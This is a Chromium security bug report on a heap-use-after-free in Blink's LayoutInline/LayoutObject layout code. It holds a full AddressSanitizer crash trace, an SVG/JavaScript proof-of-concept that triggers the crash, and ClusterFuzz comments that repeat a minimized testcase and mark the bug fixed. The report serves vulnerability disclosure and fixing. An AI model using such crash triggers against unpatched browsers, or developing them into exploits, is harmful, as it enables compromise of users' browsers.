# Security: heap-use-after-free in blink::LayoutObject::LayoutObjectBitfields::selfNeedsLayout

| Field | Value |
|-------|-------|
| **Issue ID** | [40083678](https://issues.chromium.org/issues/40083678) |
| **Status** | Assigned |
| **Severity** | S3-Low |
| **Priority** | P1 |
| **Component** | Blink>Layout |
| **Reporter** | cl...@gmail.com |
| **Assignee** | cb...@chromium.org |
| **Created** | 2016-02-11 |
| **Bounty** | $3,000.00 |

## Description

**VULNERABILITY DETAILS**

This might also be a dupe of <https://crbug.com/chromium/584185> . Testcase and stack trace look different enough though.

The testcase crashes the latest asan build of chrome as follows:

=================================================================  

==14669==ERROR: AddressSanitizer: heap-use-after-free on address 0x6110000308b8 at pc 0x5621e1d002fc bp 0x7ffe6249da30 sp 0x7ffe6249da28  

READ of size 7 at 0x6110000308b8 thread T0 (chrome)  

#0 0x5621e1d002fb in blink::LayoutObject::LayoutObjectBitfields::selfNeedsLayout() const third\_party/WebKit/Source/core/layout/LayoutObject.h:1695:9  

#1 0x5621e1cffeec in blink::LayoutObject::setNeedsLayout(char const\*, blink::MarkingBehavior, blink::SubtreeLayoutScope\*) third\_party/WebKit/Source/core/layout/LayoutObject.h:1945:32  

#2 0x5621e1cf6c91 in blink::LayoutObject::setNeedsLayoutAndFullPaintInvalidation(char const\*, blink::MarkingBehavior, blink::SubtreeLayoutScope\*) third\_party/WebKit/Source/core/layout/LayoutObject.h:1961:5  

#3 0x5621e333e338 in blink::LayoutObject::setNeedsLayoutAndPrefWidthsRecalcAndFullPaintInvalidation(char const\*) third\_party/WebKit/Source/core/layout/LayoutObject.h:811:9  

#4 0x5621e48393c1 in blink::LayoutInline::addChildIgnoringContinuation(blink::LayoutObject\*, blink::LayoutObject\*) third\_party/WebKit/Source/core/layout/LayoutInline.cpp:326:9  

#5 0x5621e4838a88 in blink::LayoutInline::addChild(blink::LayoutObject\*, blink::LayoutObject\*) third\_party/WebKit/Source/core/layout/LayoutInline.cpp:268:12  

#6 0x5621e2fc2b49 in blink::LayoutTreeBuilderForElement::createLayoutObject() third\_party/WebKit/Source/core/dom/LayoutTreeBuilder.cpp:145:5  

#7 0x5621e2f51820 in blink::LayoutTreeBuilderForElement::createLayoutObjectIfNeeded() third\_party/WebKit/Source/core/dom/LayoutTreeBuilder.h:76:13  

#8 0x5621e2f5146a in blink::Element::attach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/dom/Element.cpp:1523:9  

#9 0x5621e3008a9d in blink::Node::reattach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/dom/Node.cpp:896:5  

#10 0x5621e2f55638 in blink::Element::recalcOwnStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Element.cpp:1758:9  

#11 0x5621e2f54ba4 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1698:22  

#12 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#13 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#14 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#15 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#16 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#17 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#18 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#19 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#20 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#21 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#22 0x5621e2e9e365 in blink::Document::updateStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Document.cpp:1853:13  

#23 0x5621e2e9d343 in blink::Document::updateLayoutTree(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Document.cpp:1786:5  

#24 0x5621e3c9a2c2 in blink::FrameView::updateStyleAndLayoutIfNeededRecursive() third\_party/WebKit/Source/core/frame/FrameView.cpp:2619:5  

#25 0x5621e3c99075 in blink::FrameView::updateLifecyclePhasesInternal(blink::FrameView::LifeCycleUpdateOption) third\_party/WebKit/Source/core/frame/FrameView.cpp:2455:5  

#26 0x5621e40fe15e in blink::PageAnimator::updateAllLifecyclePhases(blink::LocalFrame&) third\_party/WebKit/Source/core/page/PageAnimator.cpp:85:5  

#27 0x5621e1d2cc12 in blink::WebViewImpl::updateAllLifecyclePhases() third\_party/WebKit/Source/web/WebViewImpl.cpp:1954:5  

#28 0x5621e93ae09e in content::RenderWidgetCompositor::UpdateLayerTreeHost() content/renderer/gpu/render\_widget\_compositor.cc:925:3  

#29 0x5621dfd77f7b in cc::ProxyMain::BeginMainFrame(scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >) cc/trees/proxy\_main.cc:201:3  

#30 0x5621dfdacedf in base::internal::RunnableAdapter<void (cc::ProxyMain::\*)(scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >)>::Run(cc::ProxyMain\*, scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >) base/bind\_internal.h:179:12  

#31 0x5621dfdacc46 in base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (cc::ProxyMain::\*)(scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >)>, base::internal::TypeList<base::WeakPtr[cc::ProxyMain](javascript:void(0);) const&, scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > >::MakeItSo(base::internal::RunnableAdapter<void (cc::ProxyMain::\*)(scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >)>, base::WeakPtr[cc::ProxyMain](javascript:void(0);) const&, scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >) base/bind\_internal.h:308:5  

#32 0x5621dfdaca8f in base::internal::Invoker<base::IndexSequence<0ul, 1ul>, base::internal::BindState<base::internal::RunnableAdapter<void (cc::ProxyMain::\*)(scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >)>, void (cc::ProxyMain\*, scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >), base::WeakPtr[cc::ProxyMain](javascript:void(0);), base::internal::PassedWrapper<scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > >, base::internal::TypeList<base::internal::UnwrapTraits<base::WeakPtr[cc::ProxyMain](javascript:void(0);) >, base::internal::UnwrapTraits<base::internal::PassedWrapper<scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > > >, base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (cc::ProxyMain::\*)(scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) >)>, base::internal::TypeList<base::WeakPtr[cc::ProxyMain](javascript:void(0);) const&, scoped\_ptr<cc::BeginMainFrameAndCommitState, std::\_\_1::default\_delete[cc::BeginMainFrameAndCommitState](javascript:void(0);) > > >, void ()>::Run(base::internal::BindStateBase\*) base/bind\_internal.h:348:12  

#33 0x5621dd11c1f7 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51:3  

#34 0x5621e8eb1b5d in scheduler::TaskQueueManager::ProcessTaskFromWorkQueue(scheduler::internal::WorkQueue\*, scheduler::internal::TaskQueueImpl::Task\*) components/scheduler/base/task\_queue\_manager.cc:288:3  

#35 0x5621e8eae42a in scheduler::TaskQueueManager::DoWork(base::TimeTicks, bool) components/scheduler/base/task\_queue\_manager.cc:200:13  

#36 0x5621e8eb52ea in base::internal::InvokeHelper<true, void, base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(base::TimeTicks, bool)>, base::internal::TypeList<base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) const&, base::TimeTicks const&, bool const&> >::MakeItSo(base::internal::RunnableAdapter<void (scheduler::TaskQueueManager::\*)(base::TimeTicks, bool)>, base::WeakPtr[scheduler::TaskQueueManager](javascript:void(0);) const&, base::TimeTicks const&, bool const&) base/bind\_internal.h:308:5  

#37 0x5621dd11c1f7 in base::debug::TaskAnnotator::RunTask(char const\*, base::PendingTask const&) base/debug/task\_annotator.cc:51:3  

#38 0x5621dcf8c8c9 in base::MessageLoop::RunTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:486:3  

#39 0x5621dcf8d65d in base::MessageLoop::DeferOrRunPendingTask(base::PendingTask const&) base/message\_loop/message\_loop.cc:495:5  

#40 0x5621dcf8dcf2 in base::MessageLoop::DoWork() base/message\_loop/message\_loop.cc:607:13  

#41 0x5621dcf9c145 in base::MessagePumpDefault::Run(base::MessagePump::Delegate\*) base/message\_loop/message\_pump\_default.cc:33:21  

#42 0x5621dcf8bda5 in base::MessageLoop::RunHandler() base/message\_loop/message\_loop.cc:450:3  

#43 0x5621dcffade4 in base::RunLoop::Run() base/run\_loop.cc:56:3  

#44 0x5621dcf89628 in base::MessageLoop::Run() base/message\_loop/message\_loop.cc:293:3  

#45 0x5621e9031a7a in content::RendererMain(content::MainFunctionParams const&) content/renderer/renderer\_main.cc:226:7  

#46 0x5621dce2c390 in content::RunZygote(content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:304:14  

#47 0x5621dce2d99f in content::RunNamedProcessTypeMain(std::\_\_1::basic\_string<char, std::\_\_1::char\_traits<char>, std::\_\_1::allocator<char> > const&, content::MainFunctionParams const&, content::ContentMainDelegate\*) content/app/content\_main\_runner.cc:391:12  

#48 0x5621dce30a41 in content::ContentMainRunnerImpl::Run() content/app/content\_main\_runner.cc:752:12  

#49 0x5621dce2b251 in content::ContentMain(content::ContentMainParams const&) content/app/content\_main.cc:19:15  

#50 0x5621dba65b99 in ChromeMain chrome/app/chrome\_main.cc:67:12  

#51 0x7f2f1b7d2a3f in \_\_libc\_start\_main /build/buildd/glibc-2.21/csu/libc-start.c:289

0x6110000308b8 is located 56 bytes inside of 232-byte region [0x611000030880,0x611000030968)  

freed by thread T0 (chrome) here:  

#0 0x5621dba3a20b in \_\_interceptor\_free (/home/nils/MonkeyChrome/OpRealEstate/asan-symbolized-linux-release-374908/chrome+0x2bbe20b)  

#1 0x5621e489a674 in blink::LayoutObject::destroy() third\_party/WebKit/Source/core/layout/LayoutObject.cpp:2786:5  

#2 0x5621e467d105 in blink::LayoutBlock::removeLeftoverAnonymousBlock(blink::LayoutBlock\*) third\_party/WebKit/Source/core/layout/LayoutBlock.cpp:607:5  

#3 0x5621e467bd55 in blink::LayoutBlock::addChildIgnoringContinuation(blink::LayoutObject\*, blink::LayoutObject\*) third\_party/WebKit/Source/core/layout/LayoutBlock.cpp:485:9  

#4 0x5621e46f5628 in blink::LayoutBlockFlow::addChild(blink::LayoutObject\*, blink::LayoutObject\*) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:1979:5  

#5 0x5621e47a0e5c in blink::LayoutBoxModelObject::moveChildTo(blink::LayoutBoxModelObject\*, blink::LayoutObject\*, blink::LayoutObject\*, bool) third\_party/WebKit/Source/core/layout/LayoutBoxModelObject.cpp:1016:9  

#6 0x5621e47a129b in blink::LayoutBoxModelObject::moveChildrenTo(blink::LayoutBoxModelObject\*, blink::LayoutObject\*, blink::LayoutObject\*, blink::LayoutObject\*, bool) third\_party/WebKit/Source/core/layout/LayoutBoxModelObject.cpp:1039:9  

#7 0x5621e483ab67 in blink::LayoutInline::splitInlines(blink::LayoutBlock\*, blink::LayoutBlock\*, blink::LayoutBlock\*, blink::LayoutObject\*, blink::LayoutBoxModelObject\*) third\_party/WebKit/Source/core/layout/LayoutInline.cpp:393:5  

#8 0x5621e483a0ef in blink::LayoutInline::splitFlow(blink::LayoutObject\*, blink::LayoutBlock\*, blink::LayoutObject\*, blink::LayoutBoxModelObject\*) third\_party/WebKit/Source/core/layout/LayoutInline.cpp:476:5  

#9 0x5621e48393c1 in blink::LayoutInline::addChildIgnoringContinuation(blink::LayoutObject\*, blink::LayoutObject\*) third\_party/WebKit/Source/core/layout/LayoutInline.cpp:326:9  

#10 0x5621e4838a88 in blink::LayoutInline::addChild(blink::LayoutObject\*, blink::LayoutObject\*) third\_party/WebKit/Source/core/layout/LayoutInline.cpp:268:12  

#11 0x5621e2fc2b49 in blink::LayoutTreeBuilderForElement::createLayoutObject() third\_party/WebKit/Source/core/dom/LayoutTreeBuilder.cpp:145:5  

#12 0x5621e2f51820 in blink::LayoutTreeBuilderForElement::createLayoutObjectIfNeeded() third\_party/WebKit/Source/core/dom/LayoutTreeBuilder.h:76:13  

#13 0x5621e2f5146a in blink::Element::attach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/dom/Element.cpp:1523:9  

#14 0x5621e3008a9d in blink::Node::reattach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/dom/Node.cpp:896:5  

#15 0x5621e2f55638 in blink::Element::recalcOwnStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Element.cpp:1758:9  

#16 0x5621e2f54ba4 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1698:22  

#17 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#18 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#19 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#20 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#21 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#22 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#23 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#24 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#25 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#26 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#27 0x5621e2e9e365 in blink::Document::updateStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Document.cpp:1853:13  

#28 0x5621e2e9d343 in blink::Document::updateLayoutTree(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Document.cpp:1786:5  

#29 0x5621e3c9a2c2 in blink::FrameView::updateStyleAndLayoutIfNeededRecursive() third\_party/WebKit/Source/core/frame/FrameView.cpp:2619:5

previously allocated by thread T0 (chrome) here:  

#0 0x5621dba3a52b in \_\_interceptor\_malloc (/home/nils/MonkeyChrome/OpRealEstate/asan-symbolized-linux-release-374908/chrome+0x2bbe52b)  

#1 0x5621e487b91a in partitionAlloc third\_party/WebKit/Source/wtf/PartitionAlloc.h:660:20  

#2 0x5621e487b91a in blink::LayoutObject::operator new(unsigned long) third\_party/WebKit/Source/core/layout/LayoutObject.cpp:163  

#3 0x5621e46d042d in blink::LayoutBlockFlow::createAnonymous(blink::Document\*) third\_party/WebKit/Source/core/layout/LayoutBlockFlow.cpp:169:40  

#4 0x5621e46a70ae in blink::LayoutBlock::createAnonymousWithParentAndDisplay(blink::LayoutObject const\*, blink::EDisplay) third\_party/WebKit/Source/core/layout/LayoutBlock.cpp:2739:18  

#5 0x5621e4839f0e in blink::LayoutInline::splitFlow(blink::LayoutObject\*, blink::LayoutBlock\*, blink::LayoutObject\*, blink::LayoutBoxModelObject\*) third\_party/WebKit/Source/core/layout/LayoutInline.cpp:457:39  

#6 0x5621e48393c1 in blink::LayoutInline::addChildIgnoringContinuation(blink::LayoutObject\*, blink::LayoutObject\*) third\_party/WebKit/Source/core/layout/LayoutInline.cpp:326:9  

#7 0x5621e4838a88 in blink::LayoutInline::addChild(blink::LayoutObject\*, blink::LayoutObject\*) third\_party/WebKit/Source/core/layout/LayoutInline.cpp:268:12  

#8 0x5621e2fc2b49 in blink::LayoutTreeBuilderForElement::createLayoutObject() third\_party/WebKit/Source/core/dom/LayoutTreeBuilder.cpp:145:5  

#9 0x5621e2f51820 in blink::LayoutTreeBuilderForElement::createLayoutObjectIfNeeded() third\_party/WebKit/Source/core/dom/LayoutTreeBuilder.h:76:13  

#10 0x5621e2f5146a in blink::Element::attach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/dom/Element.cpp:1523:9  

#11 0x5621e3008a9d in blink::Node::reattach(blink::Node::AttachContext const&) third\_party/WebKit/Source/core/dom/Node.cpp:896:5  

#12 0x5621e2f55638 in blink::Element::recalcOwnStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Element.cpp:1758:9  

#13 0x5621e2f54ba4 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1698:22  

#14 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#15 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#16 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#17 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#18 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#19 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#20 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#21 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#22 0x5621e2e4c70d in blink::ContainerNode::recalcChildStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/ContainerNode.cpp:1333:17  

#23 0x5621e2f54e61 in blink::Element::recalcStyle(blink::StyleRecalcChange, blink::Text\*) third\_party/WebKit/Source/core/dom/Element.cpp:1714:13  

#24 0x5621e2e9e365 in blink::Document::updateStyle(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Document.cpp:1853:13  

#25 0x5621e2e9d343 in blink::Document::updateLayoutTree(blink::StyleRecalcChange) third\_party/WebKit/Source/core/dom/Document.cpp:1786:5  

#26 0x5621e3c9a2c2 in blink::FrameView::updateStyleAndLayoutIfNeededRecursive() third\_party/WebKit/Source/core/frame/FrameView.cpp:2619:5  

#27 0x5621e3c99075 in blink::FrameView::updateLifecyclePhasesInternal(blink::FrameView::LifeCycleUpdateOption) third\_party/WebKit/Source/core/frame/FrameView.cpp:2455:5  

#28 0x5621e40fe15e in blink::PageAnimator::updateAllLifecyclePhases(blink::LocalFrame&) third\_party/WebKit/Source/core/page/PageAnimator.cpp:85:5  

#29 0x5621e1d2cc12 in blink::WebViewImpl::updateAllLifecyclePhases() third\_party/WebKit/Source/web/WebViewImpl.cpp:1954:5  

#30 0x5621e93ae09e in content::RenderWidgetCompositor::UpdateLayerTreeHost() content/renderer/gpu/render\_widget\_compositor.cc:925:3

SUMMARY: AddressSanitizer: heap-use-after-free third\_party/WebKit/Source/core/layout/LayoutObject.h:1695:9 in blink::LayoutObject::LayoutObjectBitfields::selfNeedsLayout() const  

Shadow bytes around the buggy address:  

0x0c227fffe0c0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c227fffe0d0: fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa fa  

0x0c227fffe0e0: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x0c227fffe0f0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c227fffe100: 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa  

=>0x0c227fffe110: fd fd fd fd fd fd fd[fd]fd fd fd fd fd fd fd fd  

0x0c227fffe120: fd fd fd fd fd fd fd fd fd fd fd fd fd fa fa fa  

0x0c227fffe130: fa fa fa fa fa fa fa fa 00 00 00 00 00 00 00 00  

0x0c227fffe140: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

0x0c227fffe150: 00 00 00 00 00 fa fa fa fa fa fa fa fa fa fa fa  

0x0c227fffe160: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  

Shadow byte legend (one shadow byte represents 8 application bytes):  

Addressable: 00  

Partially addressable: 01 02 03 04 05 06 07  

Heap left redzone: fa  

Heap right redzone: fb  

Freed heap region: fd  

Stack left redzone: f1  

Stack mid redzone: f2  

Stack right redzone: f3  

Stack partial redzone: f4  

Stack after return: f5  

Stack use after scope: f8  

Global redzone: f9  

Global init order: f6  

Poisoned by user: f7  

Container overflow: fc  

Array cookie: ac  

Intra object redzone: bb  

ASan internal: fe  

Left alloca redzone: ca  

Right alloca redzone: cb  

==14669==ABORTING

**VERSION**  

Chrome Version: asan-symbolized-linux-release-374908  

Operating System: Linux

**REPRODUCTION CASE**

<svg width="100%" height="100%" viewBox="0 0 100 100"
xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">

<script type="text/javascript">
// <![CDATA[
function start() {
o0=window.document;
o2=o0.querySelector('\\*:not([id])');
o12=(new DOMParser()).parseFromString('<noscript><option><style>','text/html');
o16=o12.all[3];
o18=o12.all[5];
o18.appendChild(o2);
o113=document.createElementNS('http://www.w3.org/1999/xhtml','table');
o0.appendChild(o12.documentElement);
o207=document.createElementNS('http://www.w3.org/1999/xhtml','th');
o207.style.display='inline';
o286=document.createElementNS('http://www.w3.org/1999/xhtml','tr');
o427=document.createElementNS('http://www.w3.org/1999/xhtml','td');
o427.style.position='fixed';
o638=document.createElementNS('http://www.w3.org/1999/xhtml','col');
o742=document.createElementNS('http://www.w3.org/1999/xhtml','tfoot');
o638.appendChild(o742);
o16.appendChild(o638);
o790=document.createElementNS('http://www.w3.org/1999/xhtml','frame');
o742.appendChild(o207);
o638.style.position='absolute';
o742.appendChild(o790);
window.top.setTimeout(t, 10);
}
function t() {
o207.appendChild(o113);
o742.appendChild(o286);
o742.appendChild(o427);
}
start();
// ]]>
</script>
</svg>

**FOR CRASHES, PLEASE INCLUDE THE FOLLOWING ADDITIONAL INFORMATION**  

Type of crash: tab

## Timeline

### cl...@chromium.org (2016-02-11)

ClusterFuzz is analyzing your testcase. Developers can follow the progress at https://cluster-fuzz.appspot.com/testcase?key=5104379490729984

### ri...@chromium.org (2016-02-12)

This repros after the fix for https://crbug.com/chromium/584185, so it's definitely interesting. Mind giving this a look, dsinclair@?

### ri...@chromium.org (2016-02-12)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-12)

This medium+ severity security issue is a regression on trunk.

Please fix this asap. If you are unable to look into this soon, please revert your change.

- Your friendly ClusterFuzz

### cl...@chromium.org (2016-02-12)

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5104379490729984

Uploader: rickyz@google.com
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 7
Crash Address: 0x612000050338
Crash State:
  blink::LayoutObject::setNeedsLayout
  blink::LayoutInline::splitFlow
  blink::LayoutInline::addChildIgnoringContinuation
  
Recommended Security Severity: High

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=373065:373191

Minimized Testcase (1.20 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv9551L9dJf0pG0StcANXvCc4N38ELhi0rHcj0Kfd_5nRAYIwIX64hE2dydr261cVhxXLGMfLZsNqbw0Gg2Do4h7hLoak9etdBkYpr4h6RqNcC40Fy8KmqKv-3-wR0-AgwHR_BROrzmMOwv8cnYyeoTftdh81mA
<script>
        o0=window.document;
        o2=o0.querySelector('*:not([id])');
        o12=(new DOMParser()).parseFromString('<noscript><option><style>','text/html');
        o16=o12.all[3];
        o18=o12.all[5];
        o18.appendChild(o2);
        o113=document.createElementNS('http://www.w3.org/1999/xhtml','table');
        o0.appendChild(o12.documentElement);
        o207=document.createElementNS('http://www.w3.org/1999/xhtml','th');
        o207.style.display='inline';
        o286=document.createElementNS('http://www.w3.org/1999/xhtml','tr');
        o427=document.createElementNS('http://www.w3.org/1999/xhtml','td');
        o427.style.position='fixed';
        o638=document.createElementNS('http://www.w3.org/1999/xhtml','col');
        o742=document.createElementNS('http://www.w3.org/1999/xhtml','tfoot');
        o638.appendChild(o742);
        o16.appendChild(o638);
        o790=document.createElementNS('http://www.w3.org/1999/xhtml','frame');
        o742.appendChild(o207);
        o638.style.position='absolute';
        o742.appendChild(o790);
        window.top.setTimeout(t);
function t() {
        o207.appendChild(o113);
        o742.appendChild(o286);
        o742.appendChild(o427);
}
</script>


See https://dev.chromium.org/Home/chromium-security/bugs/reproducing-clusterfuzz-bugs for more information.

### ri...@chromium.org (2016-02-12)

[Empty comment from Monorail migration]

### ea...@chromium.org (2016-02-12)

Would you mind taking a look at this Christian?

### ri...@chromium.org (2016-02-16)

[Empty comment from Monorail migration]

### cl...@chromium.org (2016-02-19)

ClusterFuzz has detected this issue as fixed in range 375259:376290.

Detailed report: https://cluster-fuzz.appspot.com/testcase?key=5104379490729984

Uploader: rickyz@google.com
Job Type: linux_asan_chrome_mp
Platform Id: linux

Crash Type: Heap-use-after-free READ 7
Crash Address: 0x612000050338
Crash State:
  blink::LayoutObject::setNeedsLayout
  blink::LayoutInline::splitFlow
  blink::LayoutInline::addChildIgnoringContinuation
  
Recommended Security Severity: High

Regressed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=373065:373191
Fixed: https://cluster-fuzz.appspot.com/revisions?job=linux_asan_chrome_mp&range=375259:376290

Minimized Testcase (1.20 Kb):
Download: https://cluster-fuzz.appspot.com/download/AMIfv9551L9dJf0pG0StcANXvCc4N38ELhi0rHcj0Kfd_5nRAYIwIX64hE2dydr261cVhxXLGMfLZsNqbw0Gg2Do4h7hLoak9etdBkYpr4h6RqNcC40Fy8KmqKv-3-wR0-AgwHR_BROrzmMOwv8cnYyeoTftdh81mA
<script>
        o0=window.document;
        o2=o0.querySelector('*:not([id])');
        o12=(new DOMParser()).parseFromString('<noscript><option><style>','text/html');
        o16=o12.all[3];
        o18=o12.all[5];
        o18.appendChild(o2);
        o113=document.createElementNS('http://www.w3.org/1999/xhtml','table');
        o0.appendChild(o12.documentElement);
        o207=document.createElementNS('http://www.w3.org/1999/xhtml','th');
        o207.style.display='inline';
        o286=document.createElementNS('http://www.w3.org/1999/xhtml','tr');
        o427=document.createElementNS('http://www.w3.org/1999/xhtml','td');
        o427.style.position='fixed';
        o638=document.createElementNS('http://www.w3.org/1999/xhtml','col');
        o742=document.createElementNS('http://www.w3.org/1999/xhtml','tfoot');
        o638.appendChild(o742);
        o16.appendChild(o638);
        o790=document.createElementNS('http://www.w3.org/1999/xhtml','frame');
        o742.appendChild(o207);
        o638.style.position='absolute';
        o742.appendChild(o790);
        window.top.setTimeout(t);
function t() {
        o207.appendChild(o113);
        o742.appendChild(o286);
        o742.appendChild(o427);
}
</script>


